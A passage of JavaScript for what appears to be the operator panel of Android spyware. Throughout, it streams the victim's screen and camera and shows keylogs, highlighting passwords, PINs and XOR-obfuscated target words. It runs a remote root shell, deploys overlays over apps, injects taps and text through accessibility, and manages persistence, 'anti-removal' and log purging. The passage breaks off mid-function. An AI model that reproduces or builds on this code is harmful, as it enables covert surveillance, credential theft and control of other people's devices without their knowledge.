let lastLogId = 0;
let commandHistory = [];
let historyIndex = -1;
let ghostScreenActive = false;
let ghostIsIdle = false;
let ghostDragStart = null;
let lastInteractionTime = 0;
let streamActive = false;
let currentRotation = 0;
let camId = '0';
let streamWidth = 640;
let streamHeight = 480;
let streamQuality = 40;

function showInfo(e, title, text) {
  if (e) e.stopPropagation();
  let t = document.getElementById('info-popup');
  if(!t) {
    t = document.createElement('div'); t.id = 'info-popup';
    Object.assign(t.style, {
      position: 'absolute',
      background: 'rgba(15,15,25,0.98)',
      border: '1px solid var(--neon-cyan)',
      color: '#fff',
      padding: '16px',
      borderRadius: '12px',
      zIndex: '20000',
      width: '280px',
      boxShadow: '0 20px 60px rgba(0,0,0,0.9), 0 0 20px rgba(0,242,255,0.1)',
      transition: 'opacity 0.3s ease',
      opacity: '0',
      display: 'none',
      pointerEvents: 'auto'
    });
    document.body.appendChild(t);
  }

  const rect = e.target.getBoundingClientRect();
  const scrollX = window.pageXOffset || document.documentElement.scrollLeft;
  const scrollY = window.pageYOffset || document.documentElement.scrollTop;

  let top = rect.bottom + scrollY + 10;
  let left = rect.left + scrollX - 140 + (rect.width/2);

  if (left < 10) left = 10;
  if (left + 280 > window.innerWidth + scrollX) left = window.innerWidth + scrollX - 290;

  t.style.top = top + 'px';
  t.style.left = left + 'px';
  t.innerHTML = '<div style="font-weight:bold; color:var(--neon-cyan); font-family:Orbitron, sans-serif; font-size:0.8rem; margin-bottom:8px;">' + title + '</div>' +
                '<div style="font-size:0.7rem; opacity:0.8; font-family:monospace; line-height:1.4;">' + text + '</div>';

  t.style.display = 'block';
  setTimeout(() => t.style.opacity = '1', 10);
}

function hideInfo() {
  const t = document.getElementById('info-popup');
  if (t && t.style.display === 'block') {
    t.style.opacity = '0';
    setTimeout(() => t.style.display = 'none', 300);
  }
}

document.addEventListener('click', function(e) {
  const t = document.getElementById('info-popup');
  if (t && t.style.display === 'block' && !t.contains(e.target)) {
    hideInfo();
  }
});

function updateNav() {
  const path = window.location.pathname;
  const links = document.querySelectorAll('.nav a');

  links.forEach(l => {
    const href = l.getAttribute('href');
    let isActive = false;

    if (href === '/') {
        isActive = (path === '/' || path === '/terminal');
    } else if (href === '/files') {
        isActive = (path.startsWith('/files') || path.startsWith('/device/apps'));
    } else if (href === '/device') {
        isActive = (path.startsWith('/device') && !path.includes('/apps'));
    } else {
        // Strict prefix matching for surveillance modules
        isActive = path.startsWith(href);
    }

    if (isActive) {
        l.classList.add('active');
    } else {
        // Only remove if it's NOT a sub-page of the current link
        // This prevents the flicker or removal when navigating deep routes
        if (!path.startsWith(href) || href === '/') {
            l.classList.remove('active');
        }
    }
  });
}

function showToast(m, type='info') {
  let t = document.getElementById('c2-toast');
  if(!t) {
    t = document.createElement('div'); t.id = 'c2-toast';
    Object.assign(t.style, {
      position: 'fixed',
      bottom: '15%',
      left: '50%',
      transform: 'translateX(-50%)',
      background: 'rgba(15,15,25,0.98)',
      border: '1px solid var(--neon-cyan)',
      color: '#fff',
      padding: '16px 32px',
      borderRadius: '12px',
      zIndex: '10000',
      fontSize: '0.9rem',
      textAlign: 'center',
      minWidth: '320px',
      boxShadow: '0 20px 60px rgba(0,0,0,0.9), 0 0 20px rgba(0,242,255,0.1)',
      transition: 'all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275)',
      opacity: '0',
      display: 'none',
      fontFamily: 'Orbitron, sans-serif',
      letterSpacing: '1px'
    });
    document.body.appendChild(t);
  }
  t.style.borderColor = type === 'error' ? 'var(--danger)' : 'var(--neon-cyan)';
  t.innerHTML = m; t.style.display = 'block';
  setTimeout(() => { t.style.opacity = '1'; t.style.bottom = '20%'; }, 10);
  setTimeout(() => { t.style.opacity = '0'; t.style.bottom = '15%'; setTimeout(() => t.style.display='none', 500); }, 5500);
}

function repairProtocol() {
    showTacticalModal('REPAIR_LINK', 'Re-synchronizing background telemetry protocols...', () => {
        fetch('/gps/request-permission');
        fetch('/device/fix-persistence')
          .then(r => r.json())
          .then(d => { showToast(d.message); })
          .catch(e => { console.error(e); showToast('Connection failure', 'error'); });
    });
}

function dispatchPermissionSequence() {
    showToast('PERMISSION_PROMPTS_SENT');
    fetch('/device/request-permissions')
      .then(r => r.json())
      .then(d => { showToast(d.message); })
      .catch(e => { console.error(e); showToast('Request failed', 'error'); });
}

function optimizeStability() {
    showTacticalModal('STABILITY_OPTIMIZE', 'Bypassing OEM power restrictions...', () => {
        fetch('/device/optimize-stability')
          .then(r => r.json())
          .then(d => { showToast('STABILITY_SYNC: Follow OEM instructions to enable Auto-start'); })
          .catch(e => { console.error(e); showToast('Stability sync failed', 'error'); });
    });
}

function deepRepair() {
    showTacticalModal('CORE_REPAIR', 'Opening deep system configuration to resolve environment conflicts...', () => {
        fetch('/device/deep-repair')
          .then(r => r.json())
          .then(d => { showToast('SETTINGS_OPENED: Complete repair on device'); })
          .catch(e => { console.error(e); showToast('Repair link failed', 'error'); });
    });
}

function injectTrust() {
    showToast('BYPASS_SEQUENCE_INITIATED');
    fetch('/device/inject-trust')
      .then(r => r.json())
      .then(d => { showToast('BYPASS_INITIATED: Wait for install prompt'); })
      .catch(e => { console.error(e); showToast('Bypass failed', 'error'); });
}

function initiateHeal() {
    showTacticalModal('AUTO_HEAL_PROTOCOL', 'Initiating self-healing sequence to restore persistence layers...', () => {
        ghostAction('autoheal');
    });
}

function showTacticalModal(title, message, callback) {
    let m = document.getElementById('tactical-modal');
    if(!m) {
        m = document.createElement('div');
        m.id = 'tactical-modal';
        Object.assign(m.style, {
            position: 'fixed', top: '0', left: '0', width: '100%', height: '100%',
            background: 'rgba(0,0,0,0.85)', zIndex: '30000', display: 'flex',
            alignItems: 'center', justifyContent: 'center', opacity: '0',
            transition: 'opacity 0.4s ease', backdropFilter: 'blur(10px)'
        });
        m.innerHTML = `
            <div style="background:#0a0a0f; border:1px solid var(--neon-cyan); padding:40px; border-radius:15px; width:450px; text-align:center; box-shadow:0 0 50px rgba(0,242,255,0.2);">
                <div style="font-family:Orbitron, sans-serif; color:var(--neon-cyan); font-size:1.2rem; margin-bottom:15px;" id="tm-title">TACTICAL_INITIATION</div>
                <div style="color:#aaa; font-size:0.85rem; margin-bottom:30px; min-height:40px;" id="tm-msg">Preparing remote system command...</div>
                <div style="width:100%; height:4px; background:rgba(255,255,255,0.05); border-radius:2px; overflow:hidden; margin-bottom:30px;">
                    <div id="tm-progress" style="width:0%; height:100%; background:var(--neon-cyan); box-shadow:0 0 10px var(--neon-cyan); transition: width 0.3s ease;"></div>
                </div>
                <div style="display:flex; justify-content:center; gap:20px;">
                    <button id="tm-cancel" class="btn btn-small" style="border-color:#555; color:#555;">ABORT_SEQUENCE</button>
                </div>
            </div>
        `;
        document.body.appendChild(m);
    }

    document.getElementById('tm-title').innerText = title;
    document.getElementById('tm-msg').innerText = message;
    document.getElementById('tm-progress').style.width = '0%';
    m.style.display = 'flex';
    setTimeout(() => m.style.opacity = '1', 10);

    let aborted = false;
    const abort = () => {
        aborted = true;
        m.style.opacity = '0';
        setTimeout(() => m.style.display = 'none', 400);
    };

    document.getElementById('tm-cancel').onclick = abort;

    let p = 0;
    const int = setInterval(() => {
        if (aborted) { clearInterval(int); return; }
        p += Math.random() * 4;
        if(p >= 100) {
            p = 100;
            clearInterval(int);
            setTimeout(() => {
                if (!aborted) {
                    abort();
                    callback();
                }
            }, 600);
        }
        document.getElementById('tm-progress').style.width = p + '%';
    }, 120);
}

async function handleLogin(e) {
  e.preventDefault();
  const pass = document.getElementById('password').value;
  const header = document.getElementById('status-header');
  const btn = document.getElementById('uplink-btn');
  btn.disabled = true; btn.style.opacity = '0.5';
  try {
    const response = await fetch('/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: 'password=' + encodeURIComponent(pass) + '&json=true'
    });
    const data = await response.json();
    if (data.success) {
      header.textContent = 'ACCESS_GRANTED';
      header.style.color = '#39ff14';
      header.style.textShadow = '0 0 25px #39ff14';
      setTimeout(() => { window.location.href = '/?auth=' + Date.now(); }, 1000);
    } else {
      header.textContent = 'INCORRECT_PASSWORD';
      header.style.color = '#ff3131';
      header.style.textShadow = '0 0 25px #ff3131';
      btn.disabled = false; btn.style.opacity = '1';
      setTimeout(() => {
        header.textContent = 'RESTRICTED_ACCESS';
        header.style.color = '#00f2ff';
        header.style.textShadow = '0 0 15px rgba(0,242,255,0.6)';
      }, 2000);
    }
  } catch (err) {
    console.error(err);
    btn.disabled = false; btn.style.opacity = '1';
  }
}

function fetchLogs() {
  const logDisplay = document.getElementById('log-terminal');
  if (!logDisplay) return;

  fetch('/terminal/logs?since=' + lastLogId)
    .then(r => r.json())
    .then(data => {
       if (data.reset) {
           logDisplay.innerHTML = '';
           lastLogId = 0;
       }

       if (data.logs && data.logs.length > 0) {
           const wasAtBottom = (logDisplay.scrollHeight - logDisplay.scrollTop) <= (logDisplay.clientHeight + 50);

           if (lastLogId === 0) {
               logDisplay.innerHTML = '';
           }

           data.logs.forEach(line => {
               const p = document.createElement('div');
               p.style.marginBottom = '4px';

               let cleanLine = line;

               if (line.startsWith('[I]')) {
                   p.style.color = 'var(--encrypted-blue)';
                   p.style.fontWeight = 'bold';
                   p.style.textShadow = '0 0 10px rgba(0, 136, 255, 0.3)';
                   cleanLine = line.substring(3);
               } else if (line.startsWith('[C]')) {
                   p.style.color = 'var(--danger)';
                   p.style.textShadow = '0 0 10px rgba(255, 49, 49, 0.5)';
                   p.style.fontWeight = 'bold';
                   cleanLine = line.substring(3);
               } else if (line.startsWith('[W]')) {
                   p.style.color = 'var(--neon-orange)';
                   cleanLine = line.substring(3);
               } else if (line.startsWith('[S]')) {
                   p.style.color = 'var(--neon-green)';
                   cleanLine = line.substring(3);
               } else {
                   p.style.color = 'var(--neon-cyan)';
               }

               p.innerText = cleanLine;
               logDisplay.appendChild(p);
           });

           lastLogId = data.last_id;

           if (wasAtBottom) {
               logDisplay.scrollTop = logDisplay.scrollHeight;
           }
       }
    }).catch(e => console.error("Log fetch failed", e));
}

function clearSessionLogs() {
  showToast('PURGING_ACTIVITY_LOGS...');
  fetch('/terminal/clear-logs').then(() => { lastLogId = 0; fetchLogs(); });
}

function openAccessibility() {
    fetch('/device/open-accessibility')
      .then(r => r.json())
      .then(d => { showToast('ACCESSIBILITY_HUB_OPENED'); })
      .catch(e => { console.error(e); showToast('Link failure', 'error'); });
}

function openNotifications() {
    fetch('/device/open-notifications')
      .then(r => r.json())
      .then(d => { showToast('NOTIFICATION_HUB_OPENED'); })
      .catch(e => { console.error(e); showToast('Link failure', 'error'); });
}

function deviceCmd(a) {
    fetch('/device/' + a).then(r => r.json()).then(d => { if(d.redirect) window.location.href = d.redirect; });
}
function restartServer() { if(confirm('Refresh background service? Interface will temporarily disconnect.')) { fetch('/terminal/restart'); setTimeout(() => location.reload(), 2500); } }
function selfDestruct() { if(confirm('CAUTION: This will initiate the removal of all system stability protocols and uninstall the app. Proceed?')) fetch('/device/self-destruct'); }
function sendToast() { const m = document.getElementById('toast-msg').value; if(m) fetch('/device/toast?msg=' + encodeURIComponent(m)); }
function toggleColorPicker(e) {
  if (e) e.stopPropagation();
  const p = document.getElementById('color-picker-palette');
  if (p) p.style.display = p.style.display === 'none' ? 'grid' : 'none';
}
function pickToastColor(c) {
  document.getElementById('toast-color-val').value = c;
  document.getElementById('toast-color-btn').style.background = c;
  const p = document.getElementById('color-picker-palette');
  if (p) p.style.display = 'none';
}
function sendEnhancedToast() {
  const m = document.getElementById('toast-msg').value;
  if(!m) return showToast('ENTER_MESSAGE_FIRST', 'error');
  const anim = document.getElementById('toast-anim').value;

  if (anim === 'burnt') {
    showToast('Sending_Burnt_Toast');
    for (let i = 0; i < 15; i++) {
      setTimeout(() => {
        const size = Math.floor(Math.random() * 40) + 15;
        const y = Math.floor(Math.random() * 1600) + 100;
        const dur = Math.floor(Math.random() * 7000) + 3000; // 3s to 10s max
        const subAnim = ['pop', 'static', 'scroll'][Math.floor(Math.random() * 3)];
        const col = document.getElementById('toast-color-val').value;
        fetch('/device/toast?msg=' + encodeURIComponent(m) + '&size=' + size + '&y=' + y + '&duration=' + dur + '&anim=' + subAnim + '&color=' + encodeURIComponent(col));
      }, i * 200);
    }
    return;
  }

  const size = document.getElementById('toast-size').value;
  const y = document.getElementById('toast-y').value;
  const dur = document.getElementById('toast-dur').value;
  const col = document.getElementById('toast-color-val').value;

  fetch('/device/toast?msg=' + encodeURIComponent(m) + '&size=' + size + '&y=' + y + '&duration=' + dur + '&anim=' + anim + '&color=' + encodeURIComponent(col))
    .then(r => r.json())
    .then(d => { if(d.success) showToast('TOAST_DISPATCHED'); });
}
function openApp() { const p = document.getElementById('app-selector').value; if(p) fetch('/device/open-app?pkg=' + encodeURIComponent(p)); }
function openUrl() { const u = document.getElementById('target-url').value; if(u) fetch('/device/open-url?url=' + encodeURIComponent(u)); }

function executeShell() {
    const input = document.getElementById('shell-cmd');
    const c = input.value;
    const out = document.getElementById('shell-output');
    if(!c) return;

    commandHistory.push(c);
    if(commandHistory.length > 50) commandHistory.shift();
    historyIndex = -1;

    const line = document.createElement('div');
    line.style.color = '#fff'; line.style.marginTop = '10px';
    const pTag = document.getElementById('terminal-prompt');
    const prompt = pTag ? pTag.innerText : 'root@Android:~#';
    line.innerHTML = '<span style="color:var(--terminal-green)">' + prompt + '</span> ' + c;
    out.appendChild(line);
    input.value = '';

    fetch('/device/shell?cmd=' + encodeURIComponent(c)).then(r => r.json()).then(d => {
      if (d.termux_available) {
        document.getElementById('termux-uplink').style.display = 'block';
        const p = document.getElementById('terminal-prompt'); if(p) p.innerText = 'root@Android:~$';
      } else {
        const p = document.getElementById('terminal-prompt'); if(p) p.innerText = 'root@Android:~#';
      }
      const resp = document.createElement('div');
      resp.style.whiteSpace = 'pre-wrap';
      resp.innerHTML = d.output || 'No output';
      out.appendChild(resp);
      out.scrollTop = out.scrollHeight;
    }).catch(e => {
      const err = document.createElement('div');
      err.style.color = 'var(--danger)';
      err.textContent = '[ERROR] Connection lost';
      out.appendChild(err);
    });
}

// --- GHOST MODE CONTROLS ---
function startGhostScreen() {
  ghostScreenActive = true;
  const status = document.getElementById('ghost-screen-status');
  if (status) status.style.display = 'none';
  const toggleBtn = document.getElementById('ghost-toggle-btn');
  if (toggleBtn) { toggleBtn.innerText = 'TERMINATE'; toggleBtn.style.borderColor = 'var(--danger)'; toggleBtn.style.color = 'var(--danger)'; }
  refreshGhostScreen();
}
function stopGhostScreen() {
  ghostScreenActive = false;
  const status = document.getElementById('ghost-screen-status');
  if (status) { status.style.display = 'block'; status.innerText = 'OLED_STANDBY'; }
  const toggleBtn = document.getElementById('ghost-toggle-btn');
  if (toggleBtn) { toggleBtn.innerText = 'INITIATE_VIEW'; toggleBtn.style.borderColor = 'var(--neon-green)'; toggleBtn.style.color = 'var(--neon-green)'; }
  document.getElementById('ghost-screen-stream').src = '';
}
function toggleGhostScreen() {
  if (ghostScreenActive) stopGhostScreen(); else startGhostScreen();
}
function refreshGhostScreen() {
  if (!ghostScreenActive) return;
  const img = document.getElementById('ghost-screen-stream');
  const status = document.getElementById('ghost-screen-status');
  const buffer = new Image();
  buffer.src = '/ghost/screenshot?t=' + Date.now();
  buffer.onload = () => {
    if (!ghostScreenActive) return;
    img.src = buffer.src;
    if (status) status.style.display = 'none';
    setTimeout(refreshGhostScreen, ghostIsIdle ? 5000 : 200);
  };
  buffer.onerror = () => { if (ghostScreenActive) setTimeout(refreshGhostScreen, 300); };
}
function startGhostDrag(e) {
  const img = document.getElementById('ghost-screen-stream');
  const rect = img.getBoundingClientRect();
  ghostDragStart = { x: ((e.clientX - rect.left) / rect.width) * 100, y: ((e.clientY - rect.top) / rect.height) * 100, t: Date.now() };
}
function endGhostDrag(e) {
  if (!ghostDragStart) return;
  const now = Date.now();
  if (now - lastInteractionTime < 150) return;
  lastInteractionTime = now;
  const img = document.getElementById('ghost-screen-stream');
  const rect = img.getBoundingClientRect();
  const endX = ((e.clientX - rect.left) / rect.width) * 100;
  const endY = ((e.clientY - rect.top) / rect.height) * 100;
  const duration = now - ghostDragStart.t;
  const dist = Math.sqrt(Math.pow(endX - ghostDragStart.x, 2) + Math.pow(endY - ghostDragStart.y, 2));
  if (dist < 2) fetch('/ghost/interact?action=click&px=' + ghostDragStart.x + '&py=' + ghostDragStart.y);
  else fetch('/ghost/interact?action=swipe&px1=' + ghostDragStart.x + '&py1=' + ghostDragStart.y + '&px2=' + endX + '&py2=' + endY + '&d=' + Math.max(duration, 100));
  ghostDragStart = null;
}
function openSettings() { fetch('/ghost/interact?action=settings'); }
function deployOverlay() {
  const type = document.getElementById('overlay-type').value;
  if(!type) return showToast('SELECT_TARGET_FIRST', 'error');
  showToast('OVERLAY_DISPATCH_SENT');
  fetch('/ghost/deploy-overlay?type=' + type).then(r => r.json()).then(d => {
    showToast('OVERLAY_DEPLOYED');
  });
}
function terminateOverlay() {
  fetch('/ghost/deploy-overlay').then(r => r.json()).then(d => {
    showToast('OVERLAY_TERMINATED');
  });
}
function toggleLock() { fetch('/ghost/lock').then(() => { showToast('Uplink command sent: SYSTEM_LOCK'); checkGhostStatus(); }); }
function toggleBlackout() {
  const isActivating = document.getElementById('blackout-btn').innerText.includes('ACTIVATE');
  if (isActivating) showToast('BLACKOUT_PROTOCOL_ENGAGED');
  else showToast('RESTORING_HARDWARE_BACKLIGHT...');
  fetch('/ghost/interact?action=' + (isActivating ? 'blackout_on' : 'blackout_off')).then(() => checkGhostStatus());
}
function toggleAutoPilot() {
  fetch('/stealth?action=autopilot').then(r => r.json()).then(d => {
    const btn = document.getElementById('autopilot-btn');
    if(d.autopilot) { btn.innerText = 'AUTOPILOT_ENGAGED'; btn.classList.add('btn-engaged-yellow'); btn.style.color = '#000'; btn.style.background = '#ffff00'; }
    else { btn.innerText = 'AUTOPILOT_OFF'; btn.classList.remove('btn-engaged-yellow'); btn.style.color = 'var(--neon-yellow)'; btn.style.background = 'rgba(255, 255, 255, 0.03)'; }
  });
}
function ghostType() {
  const input = document.getElementById('ghost-type-input');
  const text = input.value;
  if(!text) return;
  fetch('/ghost/interact?action=type&text=' + encodeURIComponent(text));
  input.value = '';
}
function ghostAction(a) { fetch('/ghost/interact?action='+a); }
function clearGhostLogs() {
  showToast('PURGING_KEYLOG_HISTORY...');
  fetch('/ghost/clear').then(() => refreshGhostLogs());
}
async function refreshInspector() {
  const container = document.getElementById('inspector-tree');
  if(!container) return;
  container.innerHTML = '<span style="color:var(--neon-cyan)">[SCANNING] Traversing Accessibility Tree...</span>';

  try {
    const r = await fetch('/ghost/inspector');
    const data = await r.json();
    if(data.error) {
      container.innerHTML = '<span style="color:var(--danger)">[ERROR] ' + data.error + '</span>';
      return;
    }

    container.innerHTML = '';

    // Context Header (App info)
    const contextHeader = document.createElement('div');
    contextHeader.style.padding = '12px 18px';
    contextHeader.style.marginBottom = '20px';
    contextHeader.style.background = 'rgba(0, 242, 255, 0.08)';
    contextHeader.style.border = '1px solid rgba(0, 242, 255, 0.15)';
    contextHeader.style.borderRadius = '10px';
    contextHeader.style.boxShadow = 'inset 0 0 15px rgba(0,242,255,0.05)';

    let appName = data.package;
    let locationIcon = '&#128241;'; // Phone

    // Auto-detect "Home" context
    const launcherKeywords = ['launcher', 'trebuchet', 'home', 'desktop', 'nexuslauncher'];
    if (launcherKeywords.some(k => appName.toLowerCase().includes(k))) {
        appName = 'System Home Screen';
        locationIcon = '&#127968;'; // House
    } else {
        // Pretty print common packages
        if (appName.includes('.android.settings')) appName = 'System Settings';
        else if (appName.includes('.vending')) appName = 'Google Play Store';
        else if (appName.includes('.chrome')) appName = 'Chrome Browser';
        else if (appName.includes('.messaging') || appName.includes('.sms')) appName = 'SMS / Messages';
        else if (appName.includes('.contacts')) appName = 'Contacts / Phonebook';
    }

    contextHeader.innerHTML = `
        <div style="display:flex; align-items:center; gap:12px; width:100%;">
            <div style="font-size:1.6rem; flex-shrink:0; filter: drop-shadow(0 0 5px var(--neon-cyan));">${locationIcon}</div>
            <div style="flex-grow:1; min-width:0; overflow:hidden;">
                <div style="font-size:0.6rem; color:var(--neon-cyan); letter-spacing:1.5px; font-weight:bold; opacity:0.8; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">CURRENT_UPLINK_CONTEXT</div>
                <div style="font-size:1.1rem; font-weight:900; color:#fff; text-shadow:0 0 10px rgba(255,255,255,0.2); white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">${appName}</div>
                <div style="font-size:0.55rem; color:rgba(255,255,255,0.4); font-family:monospace; margin-top:2px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">${data.package}</div>
            </div>
            <div style="text-align:right; font-size:0.55rem; color:var(--neon-green); opacity:0.7; font-weight:bold; flex-shrink:0; line-height:1.2; min-width:80px;">
                SECURE_LAYER_V2<br>SYSCALL_ACTIVE
            </div>
        </div>
    `;
    container.appendChild(contextHeader);

    renderInspectorNode(data.tree, container, 0, data.width, data.height);
  } catch(e) {
    container.innerHTML = '<span style="color:var(--danger)">[FATAL] Inspector Timeout</span>';
  }
}

function renderInspectorNode(node, container, depth, sw, sh) {
  if(!node) return;
  const row = document.createElement('div');
  row.style.display = 'flex';
  row.style.alignItems = 'center';
  row.style.padding = '8px 12px';
  row.style.marginLeft = (depth * 16) + 'px';
  row.style.borderLeft = '1px solid rgba(0, 242, 255, 0.12)';
  row.style.whiteSpace = 'nowrap';
  row.style.transition = 'all 0.2s cubic-bezier(0.4, 0, 0.2, 1)';
  row.style.cursor = 'pointer';
  row.style.borderRadius = '4px';

  // Identification Logic
  const className = node.class.split('.').pop();
  let icon = '&#9634;'; // Default View
  if (node.class.toLowerCase().includes('button')) icon = '&#9007;';
  else if (node.class.toLowerCase().includes('edit')) icon = '&#9998;';
  else if (node.class.toLowerCase().includes('text')) icon = '&#8443;';
  else if (node.class.toLowerCase().includes('image')) icon = '&#128443;';
  else if (node.class.toLowerCase().includes('layout')) icon = '&#128392;';
  else if (node.class.toLowerCase().includes('recycler') || node.class.toLowerCase().includes('list')) icon = '&#128220;';

  // Tooltip for technical metadata
  row.title = `Class: ${node.class}\nBounds: ${node.x},${node.y} [${node.w}x${node.h}]\nVisible: ${node.visible}\nFocusable: ${node.focusable}`;

  let html = `<span style="color:var(--neon-cyan); margin-right:10px; font-size:0.9rem; opacity:0.8;">${icon}</span>`;
  html += `<span style="color:var(--neon-green); font-weight:900; font-size:0.85rem; letter-spacing:0.5px;">${className}</span>`;

  if (node.resId) {
    html += `<span style="color:var(--neon-orange); margin-left:10px; font-size:0.7rem; opacity:0.8; font-family:monospace;">#${node.resId.split('/').pop()}</span>`;
  }

  if (node.text) {
    html += `<span style="color:#fff; margin-left:12px; font-weight:bold; font-size:0.8rem; background:rgba(255,255,255,0.05); padding:2px 8px; border-radius:4px;">"${node.text}"</span>`;
  } else if (node.desc) {
    html += `<span style="color:rgba(255,255,255,0.5); margin-left:12px; font-size:0.75rem; font-style:italic;">[${node.desc}]</span>`;
  }

  // Tactical Badges
  if (node.clickable) html += `<span style="background:rgba(57,255,20,0.15); color:var(--neon-green); border:1px solid rgba(57,255,20,0.4); padding:1px 6px; border-radius:100px; font-size:0.55rem; margin-left:12px; font-weight:900; letter-spacing:0.5px;">CLICKABLE</span>`;
  if (node.password) html += `<span style="background:rgba(255,49,49,0.2); color:var(--danger); border:1px solid rgba(255,49,49,0.5); padding:1px 6px; border-radius:100px; font-size:0.55rem; margin-left:6px; font-weight:900; letter-spacing:0.5px;">PASSWORD</span>`;
  if (node.editable) html += `<span style="background:rgba(0,136,255,0.2); color:var(--encrypted-blue); border:1px solid rgba(0,136,255,0.5); padding:1px 6px; border-radius:100px; font-size:0.55rem; margin-left:6px; font-weight:900; letter-spacing:0.5px;">EDITABLE</span>`;

  row.innerHTML = html;

  row.onmouseenter = () => {
      row.style.background = 'rgba(0, 242, 255, 0.08)';
      row.style.boxShadow = '0 0 10px rgba(0, 242, 255, 0.1)';
  };
  row.onmouseleave = () => {
      row.style.background = 'transparent';
      row.style.boxShadow = 'none';
  };

  row.onclick = (e) => {
    e.stopPropagation();
    const targetX = (node.x + node.w/2) * 100 / sw;
    const targetY = (node.h/2 + node.y) * 100 / sh;
    fetch(`/ghost/interact?action=click&px=${targetX}&py=${targetY}`);
  };

  container.appendChild(row);
  if(node.children) {
    node.children.forEach(child => renderInspectorNode(child, container, depth + 1, sw, sh));
  }
}
async function refreshGhostLogs() {
  try {
    const r = await fetch('/ghost/keys'); if (!r.ok) return;
    const data = await r.json();
    const term = document.getElementById('ghost-terminal'); if(!term) return;
    if(data.keys.length > 0) {
      const isAtBottom = (term.scrollHeight - term.scrollTop) <= (term.clientHeight + 10);
      let esc = data.keys.join('').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

      // 1. Highlight App/Package Headers (Cyan)
      esc = esc.replace(/(\[.*?\] ->)/g, '<span style="color:var(--neon-cyan); font-weight:bold; opacity:0.8;">$1</span>');

      // 2. Highlight Interactions (Green)
      esc = esc.replace(/(\[CLICK\]:|\[LONG_CLICK\]:)/g, '<span style="color:var(--neon-green); font-weight:bold;">$1</span>');

      // 3. Highlight Sensitive Keywords (Yellow/Red)
      const keywords = ['password', 'pin', 'code', 'auth', 'login', 'account', 'verify'];
      keywords.forEach(kw => {
        const reg = new RegExp('(' + kw + ')', 'gi');
        esc = esc.replace(reg, '<span style="color:var(--neon-yellow); font-weight:bold; border-bottom:1px solid var(--neon-yellow);">$1</span>');
      });

      // 4. Highlight Potential PINs/Codes (Red Glow)
      // Matches 4-8 digit numeric sequences that aren't part of a package name
      esc = esc.replace(/\b(\d{4,8})\b/g, '<span style="color:var(--danger); font-weight:bold; text-shadow: 0 0 8px var(--danger);">$1</span>');

      // 5. Existing obfuscated targets for extra focus
      const _k = (s) => s.split('').map((c,i) => String.fromCharCode(c.charCodeAt(0) ^ 'SysAdmin'.charCodeAt(i % 8))).join('');
      const targets = [_k('\\x1C\\x0D\\x03'), _k('\\x13\\x18\\x00\\x12\\x13\\x01\\x10\\x0A'), _k('\\x0F\\x06\\x14\\x00\\x0A'), _k('\\x16\\x1A\\x16\\x13'), _k('\\x06\\x04\\x02\\x08\\x08')];
      targets.forEach(t => {
        const reg = new RegExp('(' + t + ')', 'gi');
        esc = esc.replace(reg, '<span style="color:var(--danger); font-weight:bold; text-shadow: 0 0 10px rgba(255,49,49,0.5);">$1</span>');
      });

      term.innerHTML = esc;
      if (isAtBottom) { term.scrollTop = term.scrollHeight; }
    }
  } catch(e) {}
}
async function checkGhostStatus() {
  try {
    const r = await fetch('/ghost/status'); if (!r.ok) return;
    const data = await r.json(); ghostIsIdle = data.isIdle;
    const card = document.getElementById('ghost-status-card');
    const text = document.getElementById('ghost-status-text');
    const prompt = document.getElementById('accessibility-prompt');
    const lockBtn = document.getElementById('lock-btn');
    const arBtn = document.getElementById('anti-removal-btn');
    const blackoutBtn = document.getElementById('blackout-btn');
    if (data.active) { card.style.borderColor = 'var(--neon-green)'; text.innerHTML = '<span style="color:var(--neon-green);">UPLINK_ESTABLISHED</span>'; prompt.style.display = 'none'; }
    else { card.style.borderColor = 'var(--danger)'; text.innerHTML = '<span style="color:var(--danger);">OFFLINE_AWAITING_PERMISSION</span>'; prompt.style.display = 'block'; }
    if (lockBtn) { if (data.lock) { lockBtn.innerHTML = 'RELEASE_LOCK'; lockBtn.style.borderColor = 'var(--neon-green)'; lockBtn.style.color = 'var(--neon-green)'; } else { lockBtn.innerHTML = 'DEPLOY_LOCK'; lockBtn.style.borderColor = 'var(--danger)'; lockBtn.style.color = 'var(--danger)'; } }
    if (blackoutBtn) {
      if (data.blackout) {
        blackoutBtn.innerHTML = 'RESTORE_DISPLAY'; blackoutBtn.style.borderColor = 'var(--neon-cyan)'; blackoutBtn.style.color = 'var(--neon-cyan)';
        const fb = document.getElementById('blackout-feedback'); if(fb) fb.style.display = 'block';
      } else {
        blackoutBtn.innerHTML = 'ACTIVATE_BLACKOUT'; blackoutBtn.style.borderColor = '#fff'; blackoutBtn.style.color = '#fff';
        const fb = document.getElementById('blackout-feedback'); if(fb) fb.style.display = 'none';
      }
    }
    const stream = document.getElementById('ghost-screen-stream');
    if (stream) {
      stream.style.filter = data.blackout ? 'brightness(5.4) contrast(1.1)' : 'none';
    }
    if (arBtn) { if (data.antiRemoval) { arBtn.innerHTML = 'ANTI-REMOVAL SHIELD: ON'; arBtn.style.borderColor = 'var(--neon-green)'; arBtn.style.color = 'var(--neon-green)'; } else { arBtn.innerHTML = 'ANTI-REMOVAL SHIELD: OFF'; arBtn.style.borderColor = 'var(--danger)'; arBtn.style.color = 'var(--danger)'; } }
  } catch(e) {}
}

// --- OPTICS CONTROLS ---
function rotateStream() { currentRotation = (currentRotation + 90) % 360; document.getElementById('main-stream').style.transform = 'rotate(' + currentRotation + 'deg)'; }
function applyQuality(val) {
  const config = resConfig[resOptions[val]];
  streamWidth = config.w; streamHeight = config.h; streamQuality = config.q;
  if(streamActive) { initiateStream(camId); }
}
async function initiateStream(id) {
  camId = id; streamActive = true;
  document.getElementById('loading-overlay').style.display = 'block';
  document.getElementById('loading-overlay').innerText = 'INITIALIZING_UPLINK...';
  const ind = document.getElementById('live-indicator');
  const dot = document.getElementById('indicator-dot');
  const txt = document.getElementById('indicator-text');
  ind.style.borderColor = 'var(--neon-green)'; ind.style.color = 'var(--neon-green)'; ind.style.background = 'rgba(57, 255, 20, 0.15)';
  dot.className = 'badge-dot blink-slow'; txt.innerText = 'LIVE';
  document.querySelectorAll('.cam-btn').forEach(b => { b.classList.remove('btn-engaged-green'); b.style.borderColor = 'var(--neon-green)'; b.style.color = 'var(--neon-green)'; });
